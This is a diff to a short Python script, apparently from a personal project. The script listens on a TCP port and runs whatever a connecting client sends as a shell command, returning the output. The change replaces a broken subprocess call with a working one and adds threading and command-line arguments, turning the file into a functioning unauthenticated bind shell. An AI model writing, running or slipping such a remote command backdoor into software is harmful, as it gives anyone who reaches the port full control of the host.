@@ -1,4 +1,5 @@
-import socket, subprocess
+import socket, subprocess, sys
+from threading import Thread
 
 def connect_to_socket(target_ip, target_port):
     tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -9,20 +10,21 @@ def connect_to_socket(target_ip, target_port):
 
     while True:
         client_socket, client_address = tcp_server.accept()
-        
         print(f"Connection from {client_address} has been Established")
-
         client_socket.send(bytes("Connection Established", "utf-8"))
-
         recieved_data = client_socket.recv(4096)
-        client_socket.send(bytes(subprocess.run(recieved_data.decode("utf-8")), "utf-8"))
 
+        command_output = subprocess.getoutput(recieved_data.decode("utf-8"))
+        client_socket.send(bytes(command_output, "utf-8"))
+        
 def main():
-    my_target = input("target")
-    my_target_port = input("target_port")
-    
-    try: connect_to_socket(my_target, int(my_target_port))
-    except Exception as ex: print(ex)
+    try:
+        my_target = sys.argv[1]
+        my_target_port = int(sys.argv[2])
+        
+        server_handler = Thread(target=connect_to_socket, args=(my_target, my_target_port))
+        server_handler.start()
 
-if __name__ == "__main__": main()    
+    except Exception as ex: print(f"\nUsage: python {sys.argv[0]} [Machine's IP] [Port to Listen on]\n{ex}") 
 
+if __name__ == "__main__": main()
